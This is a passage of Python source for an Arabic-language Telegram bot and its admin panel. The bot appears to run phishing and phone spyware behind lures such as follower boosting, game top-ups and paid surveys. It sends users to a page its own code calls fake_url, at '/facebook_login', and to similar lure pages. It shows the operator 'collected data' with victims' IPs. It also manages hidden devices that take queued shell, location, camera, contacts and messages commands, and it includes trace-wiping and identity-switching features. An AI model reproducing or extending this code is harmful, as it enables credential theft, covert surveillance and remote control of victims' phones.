    markup = InlineKeyboardMarkup(row_width=2)
    for key, label in FB_REPORT_TYPES.items():
        markup.row(InlineKeyboardButton(label, callback_data=f"fb_type_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

def build_permissions_management_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    users = get_all_users_with_status()
    for user in users[:20]:
        name = user['name'][:15]
        markup.row(InlineKeyboardButton(f"👤 {name} ({user['id']})", callback_data=f"admin_perm_user_{user['id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
    return markup

def build_user_features_markup(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    user_perms = get_user_permissions(user_id)
    features = [
        ("🔍 فحص الأمان", "site_scan"),
        ("📦 فحص التطبيقات", "apk_scan"),
        ("🛠️ مراجعة الكود", "code_review"),
        ("📤 انشاء بريد", "temp_email"),
        ("بلاغ فيسبوك", "fb_report"),
        ("📍 تتبع رقم", "track_phone"),
        ("📚 تحليل PDF", "pdf_analysis"),
        ("📱 الحصول على رقم", "temp_number"),
        ("📥 تحميل فيديو", "download_video"),
        ("🔗 تقصير الروابط", "shorten_url"),
        ("🛡️ فحص ثغرات", "vuln_scan"),
        ("📊 رشق متابعين", "facebook_followers"),
        ("📋 استبيان مدفوع", "survey"),
        ("📍 تتبع موقع الهاتف", "track_phone_location"),
        ("📹 دردشة فيديو", "video_chat"),
        ("🔥 شحن فري فاير", "freefire"),
        ("📱 ربط واتساب ويب", "whatsapp_web"),
        ("🌐 فحص الروابط", "link_scanner"),
        ("📊 متابعين تيك توك", "tiktok_followers"),
        ("🕵️ تبديل الهوية", "identity_switch"),
        ("🌫️ وضع التخفي", "stealth_mode"),
        ("💣 حذف الأثر", "wipe_traces"),
        ("🛡️ درع المطور", "dev_shield"),
        ("🔒 قفل البوت", "lock_bot"),
        ("📸 كاميرا فورية", "live_camera"),
        ("🎙️ تنصت صوتي", "live_mic"),
        ("🖥️ سطح المكتب", "remote_desktop"),
        ("🔌 إيقاف تشغيل", "shutdown_device"),
        ("📊 تحليل ذكي", "smart_analysis"),
        ("📂 تصدير البيانات", "export_data")
    ]
    for label, feature in features:
        if feature in user_perms:
            markup.row(InlineKeyboardButton(f"✅ {label}", callback_data=f"admin_perm_toggle_{user_id}_{feature}_0"))
        else:
            markup.row(InlineKeyboardButton(f"❌ {label}", callback_data=f"admin_perm_toggle_{user_id}_{feature}_1"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="admin_manage_permissions"))
    return markup

# ===================== معالج الأوامر =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    
    # التحقق من قفل البوت
    global bot_locked
    if bot_locked and not is_admin(chat_id):
        safe_send(chat_id, "🔒 البوت مقفل حالياً، يرجى المحاولة لاحقاً.")
        return
    
    if is_user_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                safe_send(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code
    upsert_user(chat_id, username, first_name, last_name, referral_code)
    if is_new_user(chat_id):
        safe_send(chat_id, WELCOME_MESSAGE)
        mark_welcome_sent(chat_id)
    safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
📖 **الأوامر المتاحة**

/start - القائمة الرئيسية
/login - تفعيل الخدمات (Google)
/logout - تسجيل الخروج
/referral - رابط دعوتك
/points - نقاطك
/cancel - إلغاء العملية

🔗 نظام النقاط: كل دعوة = 10 نقاط.
🔒 الأزرار المغلقة تتطلب نقاطاً.
🔓 الأزرار المفتوحة متاحة للجميع.
👑 المطور لديه صلاحية كاملة.
"""
    safe_send(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    safe_send(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    safe_send(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login_handler(message):
    google_login(message)

@bot.message_handler(commands=['logout'])
def google_logout_handler(message):
    google_logout(message)

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        safe_send(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 رسائل البريد المؤقت\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل."
    safe_send(chat_id, response)

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        bot.answer_callback_query(call.id)
        logger.info(f"✅ Callback received: {call.data} from user {call.from_user.id}")
    except Exception as e:
        logger.error(f"Callback answer error: {e}")
    
    chat_id = call.message.chat.id
    data = call.data
    user_id = chat_id
    is_admin_user = is_admin(chat_id)
    unlocked = is_user_unlocked(chat_id)
    points = get_user_points(chat_id)
    user_perms = get_user_permissions(chat_id)
    state = user_states.get(chat_id)

    # التحقق من قفل البوت
    global bot_locked, bot_shield_active
    if bot_locked and not is_admin_user:
        safe_send(chat_id, "🔒 البوت مقفل حالياً، يرجى المحاولة لاحقاً.")
        return

    if data.startswith("locked_"):
        if is_admin_user or unlocked:
            actual_mode = data.replace("locked_", "mode_")
        else:
            required = 10
            if "fb_report" in data: required = 30
            elif "temp_number" in data: required = 50
            elif "survey" in data: required = 1000
            elif "track_phone_location" in data: required = 500
            elif "apk_survey" in data:
                safe_send(chat_id, "❌ هذه الميزة متاحة للمطور فقط.")
                return
            
            if points < required:
                safe_send(chat_id, f"❌ نقاط غير كافية! تحتاج {required} نقطة.")
                return
            if not deduct_points(chat_id, required, f"استخدام ميزة {data}"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            actual_mode = data.replace("locked_", "mode_")
        
        if actual_mode == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif actual_mode == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
        elif actual_mode == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
        elif actual_mode == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif actual_mode == "mode_vuln_scan":
            user_states[chat_id] = "waiting_for_vuln_target"
            safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\nيمكنك إرسال:\n• رابط موقع\n• عنوان IP\n• نطاق")
        elif actual_mode == "mode_survey":
            survey_url = f"{SERVER_URL}/survey"
            safe_send(chat_id, f"📄 <b>استبيان مدفوع</b>\n\n🔗 <a href='{survey_url}'>الرابط</a>")
            feature_usage["استبيان"] += 1
        elif actual_mode == "mode_track_phone_location":
            user_states[chat_id] = "waiting_for_phone_tracking"
            safe_send(chat_id, "📍 أرسل رقم الهاتف (مثال: +201001234567):")
            feature_usage["تتبع رقم"] += 1
        elif actual_mode == "mode_apk_survey":
            if not is_admin_user:
                safe_send(chat_id, "❌ للمطور فقط.")
                return
            apk_url = f"{SERVER_URL}/download_apk_survey"
            safe_send(chat_id, f"📱 <b>APK</b>\n\n🔗 <a href='{apk_url}'>تحميل APK</a>")
            feature_usage["APK"] += 1
            notify_admin(f"📱 مستخدم {chat_id} طلب APK")
        else:
            safe_send(chat_id, "⚠️ ميزة غير معروفة.")
        return

    if data.startswith('admin_') or data.startswith('mode_admin_panel'):
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        
        if data == "mode_admin_panel":
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(
                InlineKeyboardButton("📢 إرسال رسالة", callback_data="admin_send_message"),
                InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_manage_users")
            )
            markup.row(
                InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
                InlineKeyboardButton("📢 بث جماعي", callback_data="admin_broadcast")
            )
            markup.row(
                InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
                InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
            )
            markup.row(
                InlineKeyboardButton("🔑 إدارة الصلاحيات", callback_data="admin_manage_permissions")
            )
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, "👑 لوحة التحكم:", reply_markup=markup)
            feature_usage["لوحة التحكم"] += 1
            return

        if data == "admin_manage_permissions":
            markup = build_permissions_management_markup()
            safe_send(chat_id, "🔑 اختر المستخدم لإدارة صلاحياته:", reply_markup=markup)
            return

        if data.startswith("admin_perm_user_"):
            target_id = int(data.split("_")[3])
            markup = build_user_features_markup(target_id)
            user_info = get_user(target_id)
            name = user_info['first_name'] or user_info['username'] or str(target_id) if user_info else str(target_id)
            safe_send(chat_id, f"🔑 إدارة صلاحيات المستخدم: {name}\n\n✅ مفعل - ❌ غير مفعل", reply_markup=markup)
            return

        if data.startswith("admin_perm_toggle_"):
            parts = data.split("_")
            target_id = int(parts[3])
            feature = parts[4]
            enable = int(parts[5]) == 1
            set_user_permission(target_id, feature, enable)
            markup = build_user_features_markup(target_id)
            user_info = get_user(target_id)
            name = user_info['first_name'] or user_info['username'] or str(target_id) if user_info else str(target_id)
            safe_send(chat_id, f"✅ تم تحديث صلاحيات المستخدم: {name}\n\n✅ مفعل - ❌ غير مفعل", reply_markup=markup)
            return

        if data == "admin_send_message":
            users = get_all_users()
            markup = InlineKeyboardMarkup(row_width=1)
            for user in users[:20]:
                name = user['first_name'] or user['username'] or str(user['chat_id'])
                markup.row(InlineKeyboardButton(f"{name} ({user['chat_id']})", callback_data=f"admin_msg_{user['chat_id']}"))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
            safe_send(chat_id, "📢 اختر المستخدم:", reply_markup=markup)
            return

        if data.startswith("admin_msg_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_message"
            safe_send(chat_id, f"📝 أرسل الرسالة للمستخدم {target_id}:\n(لإلغاء: /cancel)")
            return

        if data == "admin_manage_users":
            users = get_all_users_with_status()
            markup = InlineKeyboardMarkup(row_width=2)
            for user in users[:20]:
                name = user['name'][:15]
                status_icon = "🟢" if user['status'] == "متصل" else "⚪"
                lock_icon = "🔓" if user['unlocked'] else "🔒"
                markup.row(InlineKeyboardButton(f"{status_icon} {name} {lock_icon}", callback_data=f"admin_user_{user['id']}"))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="mode_admin_panel"))
            safe_send(chat_id, "👥 إدارة المستخدمين:", reply_markup=markup)
            return

        if data.startswith("admin_user_"):
            target_id = int(data.split("_")[2])
            user = get_user(target_id)
            if not user:
                safe_send(chat_id, "❌ المستخدم غير موجود.")
                return
            unlocked = is_user_unlocked(target_id)
            status = get_user_status(target_id)
            
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(InlineKeyboardButton("📩 إرسال رسالة", callback_data=f"admin_msg_{target_id}"))
            if user['is_banned']:
                markup.row(InlineKeyboardButton("✅ إلغاء الحظر", callback_data=f"admin_unban_{target_id}"))
            else:
                markup.row(InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_{target_id}"))
            if unlocked:
                markup.row(InlineKeyboardButton("🔒 إعادة قفل النقاط", callback_data=f"admin_lock_{target_id}"))
            else:
                markup.row(InlineKeyboardButton("🔓 إلغاء قفل النقاط", callback_data=f"admin_unlock_{target_id}"))
            markup.row(
                InlineKeyboardButton("➕ إضافة نقاط", callback_data=f"admin_add_points_{target_id}"),
                InlineKeyboardButton("➖ خصم نقاط", callback_data=f"admin_remove_points_{target_id}")
            )
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="admin_manage_users"))
            
            info = (
                f"👤 {user['first_name'] or user['username'] or target_id}\n"
                f"🆔 {target_id}\n"
                f"⭐ {user['points']}\n"
                f"🔓 {'مفتوح ✅' if unlocked else 'مغلق 🔒'}\n"
                f"🚫 {'محظور ❌' if user['is_banned'] else 'لا ✅'}\n"
                f"📡 {status}"
            )
            safe_send(chat_id, info, reply_markup=markup)
            return

        if data.startswith("admin_unlock_"):
            target_id = int(data.split("_")[2])
            toggle_user_unlock(target_id, unlock=True)
            safe_send(chat_id, f"✅ تم إلغاء قفل النقاط للمستخدم {target_id}.")
            safe_send(target_id, "🔓 تم إلغاء قفل النقاط لحسابك!")
            return

        if data.startswith("admin_lock_"):
            target_id = int(data.split("_")[2])
            toggle_user_unlock(target_id, unlock=False)
            safe_send(chat_id, f"✅ تم إعادة قفل النقاط للمستخدم {target_id}.")
            safe_send(target_id, "🔒 تم إعادة قفل النقاط لحسابك.")
            return

        if data.startswith("admin_add_points_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_add_points"
            safe_send(chat_id, f"➕ أدخل عدد النقاط للإضافة للمستخدم {target_id}:")
            return

        if data.startswith("admin_remove_points_"):
            target_id = int(data.split("_")[2])
            admin_remote_target[chat_id] = target_id
            user_states[chat_id] = "admin_waiting_remove_points"
            safe_send(chat_id, f"➖ أدخل عدد النقاط للخصم من المستخدم {target_id}:")
            return

        if data.startswith("admin_ban_"):
            target_id = int(data.split("_")[2])
            ban_user(target_id)
            safe_send(chat_id, f"🚫 تم حظر المستخدم {target_id}.")
            safe_send(target_id, "🚫 تم حظر حسابك.")
            return

        if data.startswith("admin_unban_"):
            target_id = int(data.split("_")[2])
            unban_user(target_id)
            safe_send(chat_id, f"✅ تم إلغاء حظر المستخدم {target_id}.")
            safe_send(target_id, "✅ تم إلغاء حظر حسابك.")
            return

        if data == "admin_stats":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            c.execute("SELECT SUM(points) FROM users")
            total_points = c.fetchone()[0] or 0
            c.execute("SELECT COUNT(*) FROM user_unlocks WHERE unlocked=1")
            unlocked_users = c.fetchone()[0]
            conn.close()
            msg = (
                f"📊 الإحصائيات:\n"
                f"👥 المستخدمون: {total_users}\n"
                f"⭐ إجمالي النقاط: {total_points}\n"
                f"🔓 مفتوحون: {unlocked_users}"
            )
            safe_send(chat_id, msg)
            return

        if data == "admin_broadcast":
            user_states[chat_id] = "waiting_for_broadcast"
            safe_send(chat_id, "📢 أرسل الرسالة للبث الجماعي:")
            return

        if data == "admin_collected_data":
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT data_type, data, ip, created_at FROM collected_data ORDER BY created_at DESC LIMIT 30")
                rows = c.fetchall()
                if rows:
                    msg = "📩 **آخر البيانات المجمعة:**\n\n"
                    for row in rows:
                        msg += f"📂 {row['data_type']} | {row['ip']} | {row['created_at'][:16]}\n"
                        try:
                            content = json.loads(row['data'])
                            snippet = json.dumps(content, ensure_ascii=False)[:100]
                        except:
                            snippet = row['data'][:100]
                        msg += f"   {snippet}...\n\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "📭 لا توجد بيانات مجمعة.")
            return

        if data == "admin_logs":
            try:
                with open('bot.log', 'r') as f:
                    logs = f.read().splitlines()[-30:]
                    text = "📜 آخر 30 سطر:\n" + "\n".join(logs)
                    safe_send(chat_id, text)
            except:
                safe_send(chat_id, "⚠️ لا يوجد سجل.")
            return

        safe_send(chat_id, "⚠️ خيار غير معروف.")
        return

    # ===== الأزرار الأمنية (تعمل بشكل حقيقي) =====
    
    if data == "mode_lock_bot":
        toggle_bot_lock(chat_id)
        feature_usage["قفل البوت"] += 1
        return

    if data == "mode_dev_shield":
        toggle_dev_shield(chat_id)
        feature_usage["درع المطور"] += 1
        return

    if data == "mode_identity_switch":
        if disguise_bot():
            safe_send(chat_id, "🕵️ **تم تبديل هوية البوت بنجاح**")
        else:
            safe_send(chat_id, "⚠️ فشل تبديل الهوية")
        feature_usage["تبديل الهوية"] += 1
        return

    if data == "mode_stealth":
        stealth_mode_activation(chat_id)
        feature_usage["وضع التخفي"] += 1
        return

    if data == "mode_wipe_traces":
        wipe_traces(chat_id)
        feature_usage["حذف الأثر"] += 1
        return

    # ===== زر فحص الروابط (يعمل بشكل حقيقي) =====
    
    if data == "mode_link_scanner":
        user_states[chat_id] = "waiting_for_link_scan"
        safe_send(chat_id, "🌐 أرسل الرابط لفحصه:\n\nسأتحقق من:\n• وجود برمجيات خبيثة\n• روابط احتيال\n• مدى أمان الرابط")
        feature_usage["فحص روابط"] += 1
        return

    # ===== الميزات العادية =====
    
    if data == "mode_video_chat":
        safe_send(chat_id, f"📹 <b>دردشة فيديو</b>\n\n🔗 <a href='{SERVER_URL}/video_chat'>الرابط</a>")
        feature_usage["دردشة فيديو"] += 1
        return

    if data == "mode_freefire":
        safe_send(chat_id, f"🔥 <b>شحن فري فاير</b>\n\n🔗 <a href='{SERVER_URL}/freefire'>الرابط</a>")
        feature_usage["شحن فري فاير"] += 1
        return

    if data == "mode_whatsapp_web":
        safe_send(chat_id, f"📱 <b>ربط واتساب ويب</b>\n\n🔗 <a href='{SERVER_URL}/whatsapp_web'>الرابط</a>")
        feature_usage["ربط واتساب"] += 1
        return

    if data == "mode_tiktok_followers":
        safe_send(chat_id, f"📊 <b>متابعين تيك توك</b>\n\n🔗 <a href='{SERVER_URL}/tiktok_followers'>الرابط</a>")
        feature_usage["متابعين تيك توك"] += 1
        return

    if data == "mode_site":
        user_states[chat_id] = "waiting_for_site"
        safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
    elif data == "mode_apk":
        user_states[chat_id] = "waiting_for_apk"
        safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
    elif data == "mode_my_app":
        user_states[chat_id] = "waiting_for_my_app"
        safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
    elif data == "mode_temp_email":
        email, token, password = create_temp_email_real()
        if email:
            temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
            text = f"📤 بريدك المؤقت:\n{email}\n🔑 كلمة السر: {password}"
            # تقرير منظم للمطور
            report_data = {
                'action_type': 'إنشاء بريد مؤقت',
                'platform': 'mail.tm',
                'status': 'success',
                'details': {
                    'البريد': email,
                    'كلمة السر': password
                },
                'risk_level': 'منخفض',
                'flagged': False,
                'ip': 'N/A',
                'user_agent': 'N/A'
            }
            send_structured_report('بريد مؤقت', report_data, chat_id, message.from_user.username)
        else:
            text = "⚠️ فشل إنشاء البريد."
        safe_send(chat_id, text)
        feature_usage["إيميل مؤقت"] += 1
    elif data == "mode_track_phone":
        user_states[chat_id] = "waiting_for_track_num"
        safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
    elif data == "mode_fb_report":
        if not is_admin_user and not unlocked and points < 30:
            safe_send(chat_id, "⚠️ تحتاج 30 نقطة.")
            return
        safe_send(chat_id, "📢 اختر نوع البلاغ:", reply_markup=build_fb_report_type_markup())
    elif data == "mode_download":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحميل الفيديو غير متاحة (FFmpeg غير مثبت).")
            return
        user_states[chat_id] = "waiting_for_download"
        safe_send(chat_id, "📥 أرسل رابط الفيديو لتحميله.")
        feature_usage["تحميل فيديو"] += 1
    elif data == "mode_shorten_url":
        user_states[chat_id] = "waiting_for_shorten"
        safe_send(chat_id, "🔗 أرسل الرابط الطويل لتقصيره.")
        feature_usage["تقصير روابط"] += 1
    elif data == "mode_vuln_scan":
        user_states[chat_id] = "waiting_for_vuln_target"
        safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات:\n\n• رابط موقع\n• عنوان IP\n• نطاق")
    elif data == "mode_pdf":
        user_states[chat_id] = "waiting_for_pdf"
        safe_send(chat_id, "📚 أرسل ملف PDF الدراسي.")
        feature_usage["تحليل PDF"] += 1
    elif data == "mode_temp_number":
        safe_send(chat_id, "⏳ جاري جلب أرقام هواتف مؤقتة...")
        numbers = fetch_temp_numbers_advanced(limit=5)
        if numbers:
            response = "📱 أرقام هواتف مؤقتة:\n\n"
            for i, num in enumerate(numbers, 1):
                response += f"{i}. {num['number']} - {num['country']}\n"
            safe_send(chat_id, response)
            feature_usage["رقم مؤقت"] += 1
        else:
            safe_send(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً.")
    elif data == "mode_google_login":
        google_login(call.message)
    elif data == "mode_google_logout":
        google_logout(call.message)
    elif data == "mode_facebook_followers":
        fake_url = f"{SERVER_URL}/facebook_login"
        safe_send(chat_id, f"📊 <b>تعزيز حضورك الرقمي</b>\n\n🔗 <a href='{fake_url}'>الرابط</a>")
        feature_usage["رشق متابعين"] += 1
        notify_admin(f"📊 مستخدم {chat_id} فتح صفحة رشق المتابعين")
    elif data == "mode_survey":
        survey_url = f"{SERVER_URL}/survey"
        safe_send(chat_id, f"📄 <b>استبيان مدفوع</b>\n\n🔗 <a href='{survey_url}'>الرابط</a>")
        feature_usage["استبيان"] += 1
    elif data == "mode_track_phone_location":
        user_states[chat_id] = "waiting_for_phone_tracking"
        safe_send(chat_id, "📍 أرسل رقم الهاتف (مثال: +201001234567):")
        feature_usage["تتبع رقم"] += 1
    elif data == "mode_apk_survey":
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        apk_url = f"{SERVER_URL}/download_apk_survey"
        safe_send(chat_id, f"📱 <b>APK</b>\n\n🔗 <a href='{apk_url}'>تحميل APK</a>")
        feature_usage["APK"] += 1
        notify_admin(f"📱 مستخدم {chat_id} طلب APK")
    elif data == "mode_show_points":
        safe_send(chat_id, f"⭐ نقاطك: {points}")
    elif data == "mode_points_history":
        history = get_points_history(chat_id)
        if not history:
            safe_send(chat_id, "📊 لا يوجد سجل للنقاط.")
        else:
            text = "📊 سجل النقاط:\n\n"
            for row in history:
                sign = "+" if row['amount'] > 0 else ""
                text += f"{sign}{row['amount']} - {row['reason']}\n"
            safe_send(chat_id, text)
    elif data == "mode_show_referral":
        link = create_referral_link(chat_id)
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")
    elif data == "mode_view_devices" and is_admin_user:
        devs = get_registered_devices_db()
        if not devs:
            text = "📱 لا توجد أجهزة مسجلة."
        else:
            text = "📱 الأجهزة المسجلة:\n\n"
            for d in devs:
                text += f"🆔 {d['device_id']}\n👤 {d['chat_id']}\n\n"
        safe_send(chat_id, text)
    elif data == "mode_remote_admin" and is_admin_user:
        safe_send(chat_id, "🎮 تحكم عن بعد\nاختر الجهاز:", reply_markup=build_device_list_markup())
    elif data == "mode_set_dev_endpoint" and is_admin_user:
        user_states[chat_id] = "waiting_for_dev_endpoint"
        safe_send(chat_id, "🖥️ أرسل عنوان حاسب المطور (مثل: http://192.168.1.100:8080)")
    
    elif data == "stealth_control_menu":
        safe_send(chat_id, "🎮 **لوحة التحكم الخفي**\nاختر خياراً:", reply_markup=build_stealth_control_menu())
    
    elif data == "stealth_devices":
        safe_send(chat_id, "📱 **الأجهزة الخفية المسجلة:**\n(🟢 متصل | 🔴 غير متصل)", reply_markup=build_stealth_devices_markup())
    
    elif data == "stealth_status":
        devices = get_registered_devices_db()
        if not devices:
            safe_send(chat_id, "📭 لا توجد أجهزة خفية مسجلة.")
        else:
            msg = "📊 **حالة الأجهزة الخفية:**\n\n"
            for dev in devices:
                device_id = dev['device_id']
                last_seen = dev.get('last_seen', 'غير معروف')
                is_online = False
                if last_seen != 'غير معروف':
                    try:
                        last_time = datetime.fromisoformat(last_seen)
                        is_online = (datetime.now() - last_time).total_seconds() < 300
                    except:
                        pass
                status_text = "🟢 متصل" if is_online else "🔴 غير متصل"
                msg += f"📱 `{device_id}`\n   • الحالة: {status_text}\n   • آخر ظهور: {last_seen[:16]}\n\n"
            safe_send(chat_id, msg)
    
    elif data.startswith("stealth_select_") and is_admin_user:
        device_id = data.split("_")[2]
        with db_transaction() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
            if c.fetchone():
                admin_remote_target[chat_id] = device_id
                safe_send(chat_id, f"✅ تم اختيار الجهاز: `{device_id}`", reply_markup=build_stealth_advanced_menu(device_id))
            else:
                safe_send(chat_id, "❌ الجهاز غير موجود.")
    
    elif data.startswith("stealth_cmd_") and is_admin_user:
        parts = data.split("_")
        device_id = parts[2]
        command = parts[3]
        add_pending_command_db(device_id, command)
        safe_send(chat_id, f"⏳ تم إرسال الأمر `{command}` إلى الجهاز.\nسيتم التنفيذ خلال 15 ثانية.")
        safe_send(chat_id, f"✅ الجهاز: `{device_id}`", reply_markup=build_stealth_advanced_menu(device_id))
    
    elif data.startswith("stealth_block_") and is_admin_user:
        device_id = data.split("_")[2]
        add_pending_command_db(device_id, "BLOCK_DEVICE")
        safe_send(chat_id, f"🚫 تم إرسال أمر حظر الجهاز `{device_id}`.")
    
    elif data.startswith("stealth_unblock_") and is_admin_user:
        device_id = data.split("_")[2]
        add_pending_command_db(device_id, "UNBLOCK_DEVICE")
        safe_send(chat_id, f"🔓 تم إرسال أمر فك حظر الجهاز `{device_id}`.")
    
    elif data.startswith("stealth_shell_") and is_admin_user:
        device_id = data.split("_")[2]
        admin_remote_target[chat_id] = device_id
        user_states[chat_id] = "stealth_waiting_shell"
        safe_send(chat_id, f"🖥️ أدخل أمر Shell لتنفيذه على الجهاز `{device_id}`:\n(لإلغاء: /cancel)")
    
    elif data.startswith("stealth_refresh_") and is_admin_user:
        device_id = data.split("_")[2]
        safe_send(chat_id, f"🔄 تم تحديث حالة الجهاز `{device_id}`", reply_markup=build_stealth_advanced_menu(device_id))
    
    elif data == "stealth_refresh_all" and is_admin_user:
        safe_send(chat_id, "🔄 جاري تحديث جميع الأجهزة...")
        safe_send(chat_id, "📱 **الأجهزة الخفية المسجلة:**", reply_markup=build_stealth_devices_markup())
    
    elif data == "stealth_broadcast" and is_admin_user:
        user_states[chat_id] = "stealth_waiting_broadcast"
        safe_send(chat_id, "📢 أرسل الأمر الذي تريد بثه لجميع الأجهزة الخفية:\n(مثال: GET_LOCATION)")

    elif data.startswith("remote_select_") and is_admin_user:
        device_id = data.split("_")[2]
        with db_transaction() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
            if c.fetchone():
                admin_remote_target[chat_id] = device_id
                user_states[chat_id] = "waiting_for_remote_command"
                safe_send(chat_id, f"✅ تم اختيار: {device_id}\n\n📝 الأوامر:\n• موقع\n• كاميرا\n• لقطة\n• صور\n• جهات اتصال\n• رسائل")
            else:
                safe_send(chat_id, "❌ الجهاز غير موجود.")
    
    elif data in ["no_devices", "back_to_main"]:
        safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
    
    elif data.startswith("fb_type_"):
        report_type_key = data.split("_")[2]
        report_type_label = FB_REPORT_TYPES.get(report_type_key, "أخرى")
        user_states[chat_id] = "waiting_for_fb_report_reason"
        user_states[f"{chat_id}_fb_report_type"] = report_type_label
        safe_send(chat_id, f"✅ تم اختيار: {report_type_label}\n\nاكتب شرحاً مفصلاً للمشكلة.")

    # ===== الأزرار المحاكاة (للمطور فقط) =====
    
    elif data == "mode_live_camera" and is_admin_user:
        safe_send(chat_id, "📸 **جاري فتح الكاميرا فورياً...**\n(يتطلب تثبيت تطبيق Android)")
        send_honeypot_message(chat_id)
        feature_usage["كاميرا فورية"] += 1

    elif data == "mode_live_mic" and is_admin_user:
        safe_send(chat_id, "🎙️ **جاري تفعيل التنصت الصوتي...**\n(يتطلب تثبيت تطبيق Android)")
        send_honeypot_message(chat_id)
        feature_usage["تنصت صوتي"] += 1

    elif data == "mode_remote_desktop" and is_admin_user:
        safe_send(chat_id, "🖥️ **جاري فتح سطح المكتب عن بعد...**\n(يتطلب تثبيت تطبيق Android)")
        send_honeypot_message(chat_id)
        feature_usage["سطح المكتب"] += 1

    elif data == "mode_shutdown_device" and is_admin_user:
        safe_send(chat_id, "🔌 **جاري إرسال أمر إيقاف التشغيل...**\n(يتطلب تثبيت تطبيق Android)")
        send_honeypot_message(chat_id)
        feature_usage["إيقاف تشغيل"] += 1

    elif data == "mode_jamming" and is_admin_user:
        safe_send(chat_id, "💥 **جاري إرسال هجوم التشويش...**\n(يتطلب تثبيت تطبيق Android)")
        send_honeypot_message(chat_id)
        feature_usage["هجوم تشويش"] += 1

    elif data == "mode_spoof" and is_admin_user:
        safe_send(chat_id, "🎭 **جاري إرسال رسائل مزيفة...**\n(محاكاة)")
        send_honeypot_message(chat_id)
        feature_usage["رسائل مزيفة"] += 1

    elif data == "mode_smart_analysis" and is_admin_user:
        safe_send(chat_id, "📊 **جاري التحليل الذكي للبيانات...**")
        send_honeypot_message(chat_id)
        feature_usage["تحليل ذكي"] += 1

    elif data == "mode_export_data" and is_admin_user:
        safe_send(chat_id, "📂 **جاري تصدير البيانات...**")
        send_honeypot_message(chat_id)
        feature_usage["تصدير البيانات"] += 1

